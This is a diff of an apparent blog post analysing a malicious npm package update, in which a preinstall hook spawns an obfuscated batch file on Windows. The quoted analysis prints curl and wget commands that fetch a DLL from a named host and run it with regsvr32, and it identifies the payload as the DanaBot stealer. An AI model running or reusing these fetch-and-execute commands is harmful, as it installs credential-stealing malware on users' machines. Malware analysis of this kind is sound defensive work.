@@ -23,6 +23,7 @@ A diff showed two new files added and changes to the packages.json file adding a
     * ONLY Windows machines are targeted in this case, if Windows then:
     * `child_proccess.spawn("cmd.exe /c compile.bat")`
 3. The obfuscated `compile.bat` file attempts to get a secondary payload and then run it
+
 ```
 Attempt 1: curl https://pastorcryptograph.at/3/sdd.dll -o compile.dll
 Attempt 2: wget https://pastorcryptograph.at/3/sdd.dll -O compile.dll
@@ -32,6 +33,7 @@ regsvr32.exe -s compile.dll
 ```
 
 ### Visual path of execution
+
 <img style="align:left" src="{{ site.url }}/assets/img/blogging/coa_203_01.png"/>
 
 ### What gets dropped?
@@ -54,6 +56,7 @@ Config extractors matched this secondary payload to be a DanaBot information ste
 | MD5 (compile.dll) | f778af11f5e5b2a1ee4ed8e54461e85a |
 
 ## Technical Analysis
+
 ### Deobfuscating: `compile.js`
 The following details the analysis of the `compile.js` file that was checked into the repository.  This is the start of the attack as it gets executed in node via the preinstall in package.json
 
